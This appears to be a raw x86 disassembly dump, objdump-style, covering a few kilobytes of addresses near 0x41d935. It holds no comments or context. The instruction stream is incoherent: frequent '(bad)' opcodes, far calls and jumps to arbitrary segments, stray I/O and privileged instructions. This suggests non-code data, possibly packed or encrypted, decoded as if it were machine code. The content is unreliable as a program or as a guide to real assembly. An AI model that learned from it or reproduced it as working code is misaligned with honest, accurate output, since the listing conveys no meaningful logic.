  41d935:	xchg   DWORD PTR [edx],esi
  41d937:	je     0x41d92d
  41d939:	shr    BYTE PTR [ecx+ebp*4-0x7c086388],1
  41d940:	(bad)  
  41d941:	rol    BYTE PTR [esi+0x31],cl
  41d944:	or     eax,0x5d1bc4bc
  41d949:	inc    ecx
  41d94a:	and    DWORD PTR [eax+0x77],eax
  41d94d:	adc    DWORD PTR [ecx+0x29],ebp
  41d950:	inc    ebp
  41d951:	add    BYTE PTR [ecx-0x5],0x15
  41d955:	mov    al,ds:0x9dc4133f
  41d95a:	and    edx,DWORD PTR [esi+0x55]
  41d95d:	cmp    al,0xfc
  41d95f:	arpl   cx,di
  41d961:	ins    DWORD PTR es:[edi],dx
  41d962:	add    edx,DWORD PTR [ebx]
  41d964:	xchg   edi,eax
  41d965:	int    0xf0
  41d967:	or     ah,ah
  41d969:	add    DWORD PTR [esi-0x611d0e4c],0xffffffa9
  41d970:	ja     0x41d920
  41d972:	es cli 
  41d974:	repnz retf 0x8659
  41d978:	jecxz  0x41d918
  41d97a:	xor    al,0x87
  41d97c:	sub    DWORD PTR [ebx+0x4f6b23b7],eax
  41d982:	mov    ebx,0xf9cc0fdc
  41d987:	and    bh,BYTE PTR [edx+0x6e]
  41d98a:	ret    
  41d98b:	lods   eax,DWORD PTR ds:[esi]
  41d98c:	cs popf 
  41d98e:	mov    eax,0x6c2a5777
  41d993:	jne    0x41d971
  41d995:	adc    al,BYTE PTR [ecx-0x7f18dcb6]
  41d99b:	adc    ebx,DWORD PTR [esp+esi*8-0x7f]
  41d99f:	push   ebp
  41d9a0:	nop
  41d9a1:	and    BYTE PTR [edi+0x2ccdd1c1],al
  41d9a7:	retf   0x1f8f
  41d9aa:	jb     0x41d9ef
  41d9ac:	iret   
  41d9ad:	push   cs
  41d9ae:	test   eax,eax
  41d9b0:	sbb    al,0x1c
  41d9b2:	push   eax
  41d9b3:	and    eax,0x2090fb3b
  41d9b8:	push   eax
  41d9b9:	mov    dh,ch
  41d9bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9bc:	xlat   BYTE PTR ds:[ebx]
  41d9bd:	pop    ds
  41d9be:	dec    ebp
  41d9bf:	dec    esi
  41d9c0:	sub    edx,DWORD PTR [edx+0x2f208657]
  41d9c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9c7:	add    esi,DWORD PTR [edi]
  41d9c9:	fld    DWORD PTR [ebp-0x14]
  41d9cc:	add    esi,edi
  41d9ce:	popa   
  41d9cf:	pop    ecx
  41d9d0:	pop    edi
  41d9d1:	(bad)  
  41d9d2:	scas   eax,DWORD PTR es:[edi]
  41d9d3:	shl    BYTE PTR [edx],1
  41d9d5:	push   eax
  41d9d6:	or     al,0x5a
  41d9d8:	pusha  
  41d9d9:	retf   0x6294
  41d9dc:	jg     0x41da52
  41d9de:	xor    DWORD PTR [ebp+0x77],ebx
  41d9e1:	shl    DWORD PTR [esi],cl
  41d9e3:	cdq    
  41d9e4:	push   edi
  41d9e5:	push   edx
  41d9e6:	pop    es
  41d9e7:	sbb    DWORD PTR [esi-0x1e105f6a],edx
  41d9ed:	mul    BYTE PTR [ebp-0x1a]
  41d9f0:	add    DWORD PTR [edx],ebx
  41d9f2:	sbb    esi,DWORD PTR [esi+0x4f59b885]
  41d9f8:	inc    ebx
  41d9f9:	adc    ebp,DWORD PTR [ebp+0x7f]
  41d9fc:	cmp    eax,0xaf3a2073
  41da01:	adc    cl,BYTE PTR [edi+0x29]
  41da04:	test   DWORD PTR [ecx+0x684b0006],edx
  41da0a:	or     al,0xab
  41da0c:	cdq    
  41da0d:	cld    
  41da0e:	pop    esp
  41da0f:	loope  0x41da1a
  41da11:	cmp    eax,0xbaa54287
  41da16:	mov    bh,0x79
  41da18:	and    BYTE PTR [eax],dl
  41da1a:	sbb    dl,BYTE PTR gs:[edi]
  41da1d:	stos   BYTE PTR es:[edi],al
  41da1e:	pop    eax
  41da1f:	(bad)  
  41da20:	and    eax,0xc0889999
  41da25:	aaa    
  41da26:	cmp    eax,0xd600d2d7
  41da2b:	adc    al,0xcd
  41da2e:	aam    0x65
  41da30:	dec    eax
  41da31:	add    al,0xed
  41da33:	adc    eax,0xde
	...
  41da94:	add    BYTE PTR [eax],al
  41da96:	sbb    al,0x15
  41da98:	jnp    0x41daed
  41da9a:	jnp    0x41db1b
  41da9c:	cmp    al,0x5f
  41da9e:	out    dx,al
  41da9f:	lahf   
  41daa0:	push   esi
  41daa1:	pop    es
  41daa2:	mov    eax,0xc5353264
  41daa7:	cmp    DWORD PTR [ecx],eax
  41daa9:	add    BYTE PTR [edi],al
  41daab:	add    DWORD PTR [eax],eax
  41daad:	add    ch,dl
  41daaf:	push   ebx
  41dab0:	add    eax,0xd1203cd2
  41dab5:	js     0x41db23
  41dab7:	in     eax,dx
  41dab8:	stos   DWORD PTR es:[edi],eax
  41dab9:	shr    BYTE PTR [eax+ebx*1],0x1a
  41dabd:	add    BYTE PTR [ebx],dl
  41dabf:	int    0xa0
  41dac1:	sbb    bh,BYTE PTR [edx]
  41dac3:	push   0xfd8602b7
  41dac8:	int    0x73
  41daca:	inc    esp
  41dacb:	jp     0x41daaa
  41dacd:	sbb    dl,BYTE PTR [ecx]
  41dacf:	sub    BYTE PTR [edi],ah
  41dad1:	pop    es
  41dad2:	(bad)  
  41dad3:	jl     0x41dadd
  41dad5:	jge    0x41dad3
  41dad7:	(bad)  
  41dad9:	cmp    ecx,DWORD PTR [eax]
  41dadb:	add    DWORD PTR [ebx-0x58],edi
  41dade:	retf   
  41dadf:	inc    edx
  41dae0:	test   DWORD PTR [edx+0x70c8af3b],eax
  41dae6:	mov    ds:0x50b3ac0b,eax
  41daeb:	push   es
  41daec:	jmp    0xfa41:0xd9b52168
  41daf3:	int    0x4b
  41daf5:	xor    BYTE PTR [edi-0x4a],cl
  41daf8:	pusha  
  41daf9:	out    dx,al
  41dafa:	and    eax,DWORD PTR [esp+ebp*1]
  41dafd:	mov    DWORD PTR [ebx+0x6382f5cd],ebp
  41db03:	pop    ss
  41db04:	das    
  41db05:	clc    
  41db06:	add    BYTE PTR [edi+0x55],cl
  41db09:	mov    eax,ds:0xa10abc69
  41db0e:	inc    ecx
  41db0f:	test   eax,0x2f5ac690
  41db14:	out    0xf3,eax
  41db16:	xor    al,0xfb
  41db18:	pop    ecx
  41db19:	pop    ds
  41db1a:	xchg   edi,eax
  41db1b:	xchg   ebx,eax
  41db1c:	mov    al,ds:0xbd5ce0ff
  41db22:	jge    0x41dab0
  41db24:	sub    DWORD PTR [ecx+0x7ad3f21e],esp
  41db2a:	push   DWORD PTR [eax+0x6c]
  41db2d:	push   esp
  41db2e:	xor    esi,esi
  41db30:	cmp    bh,BYTE PTR [edx+0x65ee3e49]
  41db36:	sub    al,0x9f
  41db38:	and    al,0xb
  41db3a:	and    eax,0x2b83394b
  41db3f:	push   ss
  41db40:	mov    ds:0x6ca95913,eax
  41db45:	(bad)  
  41db46:	into   
  41db47:	shr    DWORD PTR [ebx+0x12],1
  41db4a:	pop    ebx
  41db4b:	add    ebp,0xffffffc2
  41db4e:	jae    0x41dbb1
  41db50:	imul   edi,DWORD PTR [edi],0xad9bbb69
  41db56:	xchg   esi,eax
  41db57:	in     eax,0x92
  41db59:	test   eax,0x3c33ad56
  41db5e:	inc    edx
  41db5f:	jo     0x41db9f
  41db61:	mov    cl,0x8c
  41db63:	sub    al,0xd5
  41db65:	jae    0x41db91
  41db67:	push   edx
  41db68:	inc    ecx
  41db69:	xlat   BYTE PTR ds:[ebx]
  41db6a:	sbb    BYTE PTR [ebx],bh
  41db6c:	xor    BYTE PTR [ebx],al
  41db6e:	retf   
  41db6f:	fwait
  41db70:	push   ds
  41db71:	jp     0x41db2f
  41db73:	and    BYTE PTR [bx+si],0x3b
  41db77:	lahf   
  41db78:	xor    al,al
  41db7a:	jnp    0x41dbbc
  41db7c:	je     0x41dbe7
  41db7e:	push   0xace14267
  41db83:	mov    esp,0x29a7ae1a
  41db88:	hlt    
  41db89:	arpl   WORD PTR [esi+eax*1+0x5e],cx
  41db8d:	xchg   esi,eax
  41db8e:	dec    ecx
  41db8f:	xchg   ecx,eax
  41db90:	or     cl,BYTE PTR [ecx]
  41db92:	pop    es
  41db93:	jle    0x41dbbe
  41db95:	mov    eax,ds:0x298159f1
  41db9a:	push   esi
  41db9b:	xor    edx,esi
  41db9d:	in     al,dx
  41db9e:	dec    eax
  41db9f:	(bad)  
  41dba0:	aas    
  41dba1:	cwde   
  41dba2:	fsubr  QWORD PTR [edi-0x2f]
  41dba5:	fidivr WORD PTR [ecx+0x47]
  41dba8:	add    BYTE PTR [ebp-0x7b3883b6],bl
  41dbae:	cld    
  41dbaf:	aam    0xa7
  41dbb1:	mov    dl,0x4c
  41dbb3:	push   ebp
  41dbb4:	inc    ebp
	...
  41dc15:	add    BYTE PTR [edi-0x36],ch
  41dc18:	adc    eax,0xefdfb598
  41dc1d:	dec    ebp
  41dc1f:	ja     0x41dc8f
  41dc21:	aas    
  41dc22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc23:	sti    
  41dc24:	xchg   esp,eax
  41dc25:	push   0xffffffcc
  41dc27:	cmp    al,BYTE PTR [ecx]
  41dc29:	add    BYTE PTR [edi],al
  41dc2b:	add    DWORD PTR [eax],eax
  41dc2d:	add    ch,al
  41dc2f:	mov    eax,0x7f15f269
  41dc34:	mov    ch,0xb1
  41dc36:	test   bl,ch
  41dc38:	jp     0x41dcb6
  41dc3a:	cld    
  41dc3b:	push   esi
  41dc3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc3d:	dec    esp
  41dc3e:	add    dh,dh
  41dc40:	lahf   
  41dc41:	xchg   ecx,eax
  41dc42:	mov    gs,WORD PTR [edi-0x66cca89]
  41dc48:	pop    edx
  41dc49:	sbb    dl,BYTE PTR [ebx+0x1c0aa165]
  41dc4f:	or     eax,0x350b6870
  41dc54:	jnp    0x41dc91
  41dc56:	ret    
  41dc57:	int3   
  41dc58:	(bad)  
  41dc59:	fidiv  WORD PTR [eax+0xe765556]
  41dc5f:	cmp    eax,0xf44c0657
  41dc64:	stos   DWORD PTR es:[edi],eax
  41dc65:	mov    ds:0x1a6c633,eax
  41dc6a:	and    edx,esi
  41dc6c:	xchg   DWORD PTR [esi],ebx
  41dc6e:	mov    edi,0x7a5a8b7d
  41dc73:	inc    edx
  41dc74:	lock sub al,0xb5
  41dc77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc78:	fs pop eax
  41dc7a:	neg    BYTE PTR [edi-0x30334718]
  41dc80:	pop    esp
  41dc81:	(bad)  [ebp+0x72]
  41dc84:	aam    0x47
  41dc86:	int3   
  41dc87:	adc    al,0x62
  41dc89:	addr16 mov ecx,0x62acfee9
  41dc8f:	xchg   ebp,eax
  41dc90:	test   BYTE PTR [ebx+eax*4-0x3e6872e2],dh
  41dc97:	dec    eax
  41dc98:	in     eax,0xce
  41dc9a:	mov    ebp,0x3b6649f2
  41dc9f:	inc    esp
  41dca0:	xor    esi,edx
  41dca2:	repz mov al,ds:0xee5f3c
  41dca8:	call   0x2d8c:0x4e360f9f
  41dcaf:	arpl   bp,si
  41dcb1:	pop    esp
  41dcb2:	(bad)  
  41dcb3:	xchg   esi,eax
  41dcb4:	pop    ebx
  41dcb5:	inc    edi
  41dcb6:	sbb    al,0xc6
  41dcb8:	not    DWORD PTR [ecx+eiz*1+0x648a292c]
  41dcbf:	pop    edi
  41dcc0:	jae    0x41dcc4
  41dcc2:	mov    ch,0x3
  41dcc4:	mov    dl,0x44
  41dcc6:	call   0xbfd7:0xc554337e
  41dccd:	lahf   
  41dcce:	adc    ch,BYTE PTR [esi+0x47]
  41dcd1:	cwde   
  41dcd2:	and    al,0x13
  41dcd4:	adc    DWORD PTR [esi+0x68b0a0d2],edx
  41dcda:	or     ecx,DWORD PTR fs:[edi]
  41dcdd:	jp     0x41dd30
  41dcdf:	fild   DWORD PTR gs:[edi]
  41dce2:	dec    ebx
  41dce3:	cwde   
  41dce4:	pop    ebx
  41dce5:	add    ah,0xe2
  41dce8:	out    dx,eax
  41dce9:	adc    al,0xf2
  41dceb:	inc    esp
  41dcec:	loop   0x41dd58
  41dcee:	das    
  41dcef:	retf   
  41dcf0:	adc    eax,0xbb24b7d6
  41dcf5:	mov    bh,BYTE PTR [ebx+0x1bb5a523]
  41dcfb:	inc    eax
  41dcfc:	daa    
  41dcfd:	adc    eax,0x9b6a8cc2
  41dd02:	test   BYTE PTR ds:0xe9df52de,dl
  41dd08:	test   BYTE PTR [ebp-0x55],al
  41dd0b:	shl    BYTE PTR [ebp-0x29],cl
  41dd0e:	jl     0x41dd04
  41dd10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd11:	and    DWORD PTR [esi+0x704f12da],edx
  41dd17:	daa    
  41dd18:	cmp    cl,dl
  41dd1a:	fsubr  st(4),st
  41dd1c:	pop    esp
  41dd1d:	xchg   edi,eax
  41dd1e:	adc    al,0xf4
  41dd21:	fptan  
  41dd23:	inc    ecx
  41dd24:	mov    edx,0xc73a800c
  41dd29:	mov    edx,DWORD PTR [edx-0xc]
  41dd2c:	xchg   ebp,eax
  41dd2d:	jnp    0x41dd98
  41dd2f:	xor    eax,0x88daaeee
  41dd34:	retf   
	...
  41dd95:	add    BYTE PTR [eax],ah
  41dd97:	repz das 
  41dd99:	cmp    bh,0xde
  41dd9c:	lods   eax,DWORD PTR ds:[esi]
  41dd9d:	repz mov ds:0x201667bb,eax
  41dda3:	adc    ebx,DWORD PTR [edx+0x13bd32c]
  41dda9:	add    BYTE PTR [edi],al
  41ddab:	add    DWORD PTR [eax],eax
  41ddad:	add    BYTE PTR [edx+0x3],cl
  41ddb0:	aad    0x93
  41ddb2:	mov    WORD PTR [edx],ss
  41ddb4:	sub    eax,0xdfbe665d
  41ddb9:	fadd   DWORD PTR [eax-0x20b226f3]
  41ddbf:	inc    ecx
  41ddc0:	push   DWORD PTR [esp+edx*8]
  41ddc3:	jmp    0xda4fcb3b
  41ddc8:	out    dx,eax
  41ddc9:	pop    edx
  41ddca:	xchg   al,al
  41ddcc:	scas   eax,DWORD PTR es:[edi]
  41ddcd:	mov    es,WORD PTR [edx-0x276334c8]
  41ddd3:	mov    BYTE PTR [esi-0x1b],cl
  41ddd6:	xor    esi,ecx
  41ddd8:	aad    0x3a
  41ddda:	pop    ds
  41dddb:	adc    al,0xb0
  41dddd:	jnp    0x41de20
  41dddf:	pop    edx
  41dde0:	push   es
  41dde1:	sbb    al,0x5f
  41dde3:	push   esp
  41dde4:	xchg   esp,eax
  41dde5:	js     0x41de54
  41dde7:	mov    al,BYTE PTR [edx]
  41dde9:	cwde   
  41ddea:	cs (bad) 
  41dded:	pop    edi
  41ddee:	sub    BYTE PTR [ebp+0x18],al
  41ddf1:	popf   
  41ddf2:	lahf   
  41ddf3:	repz pop ds
  41ddf5:	push   ds
  41ddf6:	add    al,0xe6
  41ddf8:	dec    esp
  41ddf9:	pop    edi
  41ddfa:	out    0xfd,al
  41ddfc:	mov    WORD PTR [eax],es
  41ddfe:	adc    dl,BYTE PTR ds:[edi]
  41de01:	jg     0x41ddee
  41de03:	mov    esp,0x2c2f273c
  41de08:	aaa    
  41de09:	mov    edi,0xd3ec900a
  41de0e:	push   ss
  41de0f:	sub    DWORD PTR [ecx-0x1a],0xce7a16e
  41de16:	dec    ebx
  41de17:	(bad)  
  41de19:	jnp    0x41ddd3
  41de1b:	cmp    BYTE PTR [eax-0xef5517a],ah
  41de21:	or     eax,0x8cfc197d
  41de26:	outs   dx,BYTE PTR ds:[esi]
  41de27:	scas   eax,DWORD PTR es:[edi]
  41de28:	adc    DWORD PTR [ecx+0x3a2cb784],eax
  41de2e:	outs   dx,BYTE PTR ds:[esi]
  41de2f:	sub    edx,DWORD PTR [ebp-0xd]
  41de32:	mov    ebp,0xc61fbce
  41de37:	jae    0x41ddd0
  41de39:	push   edx
  41de3a:	mov    al,ds:0xaf9d1336
  41de3f:	push   esi
  41de40:	sbb    al,BYTE PTR [eax-0x58]
  41de43:	jae    0x41ddfe
  41de45:	mov    ebx,0x38ab133f
  41de4a:	jae    0x41de31
  41de4c:	add    eax,0x9b89da30
  41de51:	addr16 es leave 
  41de54:	mov    bh,0xa9
  41de56:	jns    0x41de44
  41de58:	jge    0x41de8a
  41de5a:	adc    DWORD PTR [edx-0x669207a5],edx
  41de60:	or     ecx,ebx
  41de62:	cmp    eax,0xcc25e742
  41de67:	mov    dl,0x4c
  41de69:	outs   dx,BYTE PTR ds:[esi]
  41de6a:	push   0xa7a6b82e
  41de6f:	loop   0x41deea
  41de71:	cdq    
  41de72:	sub    eax,0xdb9f26d5
  41de77:	adc    esi,ebp
  41de79:	cdq    
  41de7a:	add    DWORD PTR [edi-0x71],0xffffffa7
  41de7e:	mov    BYTE PTR [ecx-0x63486e65],bl
  41de84:	inc    edx
  41de85:	mov    al,ds:0x2d22bf51
  41de8a:	rol    edi,1
  41de8c:	and    al,BYTE PTR [edi+ebx*4]
  41de8f:	test   BYTE PTR [ecx],cl
  41de91:	mov    ebp,0x5c535111
  41de96:	icebp  
  41de97:	(bad)  
  41de98:	rcl    DWORD PTR [eax-0x108193e2],1
  41de9e:	cmp    al,0x31
  41dea0:	std    
  41dea1:	push   ds
  41dea2:	xchg   esp,eax
  41dea3:	mov    al,0x13
  41dea5:	xchg   DWORD PTR [ebp-0x53b1208f],eax
  41deab:	and    ah,BYTE PTR [esi+eax*1-0x1f]
  41deaf:	mov    ecx,0x4daad519
  41deb4:	stc    
	...
  41df15:	add    BYTE PTR [edi],bh
  41df17:	daa    
  41df18:	push   ss
  41df19:	cld    
  41df1a:	push   ds
  41df1b:	std    
  41df1c:	jmp    edi
  41df1e:	pop    es
  41df1f:	adc    eax,0xaa58c191
  41df24:	inc    ecx
  41df25:	pusha  
  41df26:	fidivr DWORD PTR [ecx+eax*1]
  41df29:	add    BYTE PTR [edi],al
  41df2b:	add    DWORD PTR [eax],eax
  41df2d:	add    dh,al
  41df2f:	pop    edx
  41df30:	push   cs
  41df31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df32:	enter  0x22ef,0x68
  41df36:	push   ds
  41df37:	mov    DWORD PTR ds:0xa9e14df4,ebx
  41df3d:	in     al,0x5f
  41df3f:	mov    eax,ds:0x267729bb
  41df44:	xor    ah,BYTE PTR [edi+0xe]
  41df47:	je     0x41df65
  41df49:	adc    eax,0x1be97f21
  41df4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df4f:	(bad)  
  41df50:	mov    ds:0xc7c104f4,eax
  41df55:	jg     0x41dfc8
  41df57:	sbb    al,0x7b
  41df59:	pop    edx
  41df5a:	xchg   edx,eax
  41df5b:	shl    al,0x20
  41df5e:	mov    edi,0x811a02ab
  41df63:	jnp    0x41dfaa
  41df65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df66:	sbb    eax,0xe0c5bb30
  41df6b:	popf   
  41df6c:	cmp    DWORD PTR [ebx-0x561e3ce3],edi
  41df72:	push   cs
  41df73:	inc    edx
  41df74:	popf   
  41df75:	mov    ah,BYTE PTR [edx]
  41df77:	(bad)  
  41df78:	repnz (bad) 
  41df7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df7b:	sbb    DWORD PTR [edi+eax*2-0x2b],esp
  41df7f:	jnp    0x41dfb3
  41df81:	and    DWORD PTR [edx+0x36],edx
  41df84:	call   0xb12983d8
  41df89:	sub    eax,0x48600767
  41df8e:	nop
  41df8f:	cmc    
  41df90:	pop    esi
  41df91:	mov    al,ds:0x395917c1
  41df96:	mov    ebx,0xbdef64a2
  41df9b:	mov    dl,0x9e
  41df9d:	mov    bl,0x47
  41df9f:	(bad)  
  41dfa0:	adc    cl,al
  41dfa2:	stc    
  41dfa3:	shr    BYTE PTR [ebx],0x2e
  41dfa6:	fdivr  DWORD PTR [ecx-0x5f]
  41dfa9:	push   cs
  41dfaa:	fs inc esi
  41dfac:	jmp    0x76b4:0xbda969aa
  41dfb3:	pop    eax
  41dfb4:	lods   eax,DWORD PTR ds:[esi]
  41dfb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfb6:	add    ecx,edx
  41dfb8:	mov    bl,0x86
  41dfba:	dec    edi
  41dfbb:	cld    
  41dfbc:	sbb    al,0xa5
  41dfbe:	retf   
  41dfbf:	or     ebp,ebp
  41dfc1:	and    BYTE PTR ds:0x28d4203f,bl
  41dfc7:	repz sbb eax,0x2abc92b
  41dfcd:	lods   al,BYTE PTR ds:[esi]
  41dfce:	jp     0x41dfd2
  41dfd0:	sbb    edi,ebx
  41dfd2:	into   
  41dfd3:	dec    eax
  41dfd4:	data16 arpl WORD PTR [ebx],bp
  41dfd7:	cmp    edi,ecx
  41dfd9:	cld    
  41dfda:	int    0x96
  41dfdc:	jnp    0x41df65
  41dfde:	cli    
  41dfdf:	mov    ds:0x32ad970,eax
  41dfe4:	ror    BYTE PTR [ecx+0x1d],0xa6
  41dfe8:	dec    edi
  41dfe9:	into   
  41dfea:	adc    eax,0x13be3c37
  41dfef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dff0:	out    dx,al
  41dff1:	enter  0xe09e,0x32
  41dff5:	les    ecx,FWORD PTR [edi+0x4d]
  41dff8:	cdq    
  41dff9:	xor    eax,0xb74c3cd6
  41dffe:	mov    dl,0xef
  41e000:	adc    al,0xfc
  41e002:	mov    al,dl
  41e004:	push   ebx
  41e005:	jns    0x41e05d
  41e007:	mov    bl,0xcc
  41e009:	mov    ebp,0x673de423
  41e00e:	dec    esi
  41e00f:	scas   eax,DWORD PTR es:[edi]
  41e010:	ficomp DWORD PTR [edx-0xa53636c]
  41e016:	sbb    al,0x64
  41e018:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e019:	jb     0x41e035
  41e01b:	lea    ecx,[ecx+0x311caff]
  41e021:	hlt    
  41e022:	add    DWORD PTR [edx-0x401d0c23],0xaef7e688
  41e02c:	leave  
  41e02d:	and    eax,0x57aa3419
  41e032:	call   0x0:0x49a6
	...
  41e095:	add    BYTE PTR [edi+0x53],cl
  41e098:	add    al,0xc
  41e09a:	sbb    al,0x5f
  41e09c:	dec    edi
  41e09d:	push   ebx
  41e09e:	out    0x48,eax
  41e0a0:	jge    0x41e0ce
  41e0a2:	(bad)  
  41e0a4:	or     ah,BYTE PTR [ecx+eiz*8+0x700013d]
  41e0ab:	add    DWORD PTR [eax],eax
  41e0ad:	add    BYTE PTR [esi+0x7e],ch
  41e0b0:	loope  0x41e0b9
  41e0b2:	mov    al,0xf6
  41e0b4:	adc    BYTE PTR [ebp+esi*2-0x73d1f347],dl
  41e0bb:	scas   eax,DWORD PTR es:[edi]
  41e0bc:	in     al,dx
  41e0bd:	pop    ebx
  41e0be:	out    dx,eax
  41e0bf:	sbb    DWORD PTR [edx-0x5b],eax
  41e0c2:	sar    ebp,0xe4
  41e0c5:	es mov eax,0xe933e10a
  41e0cb:	cmp    al,0x57
  41e0cd:	xchg   ebp,eax
  41e0ce:	(bad)  
  41e0cf:	inc    edx
  41e0d0:	fisub  WORD PTR [edx]
  41e0d2:	pop    ebp
  41e0d3:	push   ecx
  41e0d4:	jne    0x41e076
  41e0d6:	xor    al,0xf0
  41e0d8:	mov    ds:0x328eec6e,al
  41e0dd:	fisub  DWORD PTR [esi+0x13]
  41e0e0:	arpl   bx,di
  41e0e2:	test   DWORD PTR [eax-0x2d269247],edi
  41e0e8:	pop    edx
  41e0e9:	hlt    
  41e0ea:	lods   eax,DWORD PTR ds:[esi]
  41e0eb:	fsub   QWORD PTR [eax+0x5f]
  41e0ee:	cmp    BYTE PTR [esi+0x686fb426],cl
  41e0f4:	call   0xddf1:0x829e9631
  41e0fb:	cvttps2pi mm2,xmm2
  41e0fe:	xchg   esi,eax
  41e0ff:	xor    ebx,DWORD PTR [eax+0x56]
  41e102:	xchg   BYTE PTR [ecx+edi*2+0x4d],cl
  41e106:	dec    eax
  41e107:	mov    dl,0x98
  41e109:	sub    eax,0x604a86c0
  41e10e:	dec    ecx
  41e10f:	pop    eax
  41e110:	push   ebx
  41e111:	xor    eax,0x1e569904
  41e116:	call   0x5ae16f71
  41e11b:	adc    DWORD PTR [edx+0x79],ecx
  41e11e:	mov    ds:0xdac21642,al
  41e123:	and    al,BYTE PTR [eax+ebx*2+0x6038e669]
  41e12a:	or     eax,0x9667c70c
  41e12f:	cs jmp esi
  41e132:	mov    esi,0xc495e1d7
  41e137:	shr    BYTE PTR [ecx+0x13],cl
  41e13a:	sub    eax,0xb3ecb6db
  41e13f:	or     al,0xef
  41e141:	out    0xdf,al
  41e143:	sti    
  41e144:	iret   
  41e145:	ret    0x326c
  41e148:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e149:	jne    0x41e106
  41e14b:	inc    eax
  41e14c:	(bad)  
  41e14d:	cdq    
  41e14e:	cmp    dh,al
  41e150:	imul   ebx,esp,0x26
  41e153:	rol    BYTE PTR [ecx],1
  41e155:	push   esp
  41e156:	bnd jmp 0x7efad6f1
  41e15c:	mov    dh,0xd
  41e15e:	jne    0x41e141
  41e160:	jmp    0x90831b29
  41e165:	mov    al,ds:0x5ea4a66
  41e16a:	push   cs
  41e16b:	jbe    0x41e198
  41e16d:	mov    bl,0xcb
  41e16f:	mov    dh,0xec
  41e171:	call   0xbe54:0x99b70b4d
  41e178:	adc    ch,BYTE PTR [ebx-0xe54e141]
  41e17e:	pop    edi
  41e17f:	ins    DWORD PTR es:[edi],dx
  41e180:	push   0x40
  41e182:	scas   eax,DWORD PTR es:[edi]
  41e183:	es nop
  41e185:	sub    ebx,DWORD PTR [ecx-0x75]
  41e188:	repz arpl WORD PTR [esi+0x42],bp
  41e18c:	(bad)  
  41e18d:	scas   eax,DWORD PTR es:[edi]
  41e18e:	dec    eax
  41e18f:	mov    ebx,eax
  41e191:	mov    esp,0x30abf977
  41e196:	popa   
  41e197:	test   DWORD PTR [eax+0xb],edx
  41e19a:	(bad)  
  41e19b:	loop   0x41e1d4
  41e19d:	cmp    eax,0xc0d6af0f
  41e1a2:	pop    ebx
  41e1a3:	in     eax,dx
  41e1a4:	and    eax,0xff8d690d
  41e1a9:	ins    BYTE PTR es:[edi],dx
  41e1aa:	or     BYTE PTR [edi+0x6699d22e],ah
  41e1b0:	jbe    0x41e136
  41e1b2:	add    eax,0xb9cd
	...
  41e213:	add    BYTE PTR [eax],al
  41e215:	add    BYTE PTR [ebx-0x1988fe],ch
  41e21b:	idiv   DWORD PTR [ebx-0xf75b5b1]
  41e221:	mov    ecx,DWORD PTR [edi-0x171a56d2]
  41e227:	add    DWORD PTR ds:[eax],eax
  41e22a:	pop    es
  41e22b:	add    DWORD PTR [eax],eax
  41e22d:	add    BYTE PTR [edi-0x30],al
  41e230:	pushf  
  41e231:	test   al,0x3f
  41e233:	pop    ecx
  41e234:	or     eax,0xbcb9a15d
  41e239:	cs pusha 
  41e23b:	out    0xaa,eax
  41e23d:	dec    edi
  41e23e:	dec    esp
  41e23f:	jbe    0x41e23d
  41e241:	sets   BYTE PTR [ecx*8-0x1e2add97]
  41e249:	jle    0x41e206
  41e24b:	daa    
  41e24c:	and    edi,edi
  41e24e:	mov    esi,0xb0017c8
  41e253:	and    edx,DWORD PTR [ecx]
  41e255:	inc    edi
  41e256:	inc    edi
  41e257:	pop    esp
  41e258:	into   
  41e259:	cld    
  41e25a:	call   0x585637c9
  41e25f:	ret    0xfd35
  41e262:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e263:	xchg   esp,eax
  41e264:	add    dl,ah
  41e266:	mov    esp,0x3ab82f57
  41e26b:	repnz test ebx,0x8decd053
  41e272:	mov    al,0xf5
  41e274:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e275:	add    esi,DWORD PTR ds:0x22656dba
  41e27b:	cmc    
  41e27c:	nop
  41e27d:	cld    
  41e27e:	ja     0x41e29c
  41e280:	xor    DWORD PTR [ebx+0x2a1c5ab1],0xffffffba
  41e287:	imul   edx,esi,0xffffffde
  41e28a:	int3   
  41e28b:	jno    0x41e278
  41e28d:	sbb    eax,0x29ed5bd0
  41e292:	push   esp
  41e293:	nop
  41e294:	cmp    ebp,DWORD PTR [edx-0x68]
  41e297:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e298:	cmp    eax,0x7d7b4e2e
  41e29d:	dec    eax
  41e29e:	(bad)  
  41e29f:	aaa    
  41e2a0:	xchg   edi,eax
  41e2a1:	pop    edx
  41e2a2:	lock call 0x40e9b753
  41e2a8:	xchg   ebx,eax
  41e2a9:	dec    eax
  41e2aa:	cmp    edi,DWORD PTR [ebx+0x492efe8f]
  41e2b0:	push   esp
  41e2b1:	cld    
  41e2b2:	ror    DWORD PTR [esi],cl
  41e2b4:	ret    
  41e2b5:	xlat   BYTE PTR ds:[ebx]
  41e2b6:	retf   0xfd89
  41e2b9:	out    dx,eax
  41e2ba:	adc    DWORD PTR [ebp+edi*8+0x5c],edi
  41e2be:	jg     0x41e2c2
  41e2c0:	(bad)  
  41e2c1:	and    bh,BYTE PTR [ecx]
  41e2c3:	fwait
  41e2c4:	xor    dl,dh
  41e2c6:	push   edx
  41e2c7:	mov    cl,0xb1
  41e2c9:	fdiv   QWORD PTR [esi+ebp*8]
  41e2cc:	mov    esp,0x505cdf82
  41e2d1:	out    dx,al
  41e2d2:	adc    bl,cl
  41e2d4:	iret   
  41e2d5:	pop    ecx
  41e2d6:	add    ch,dh
  41e2d8:	sti    
  41e2d9:	ss mov bh,0xf8
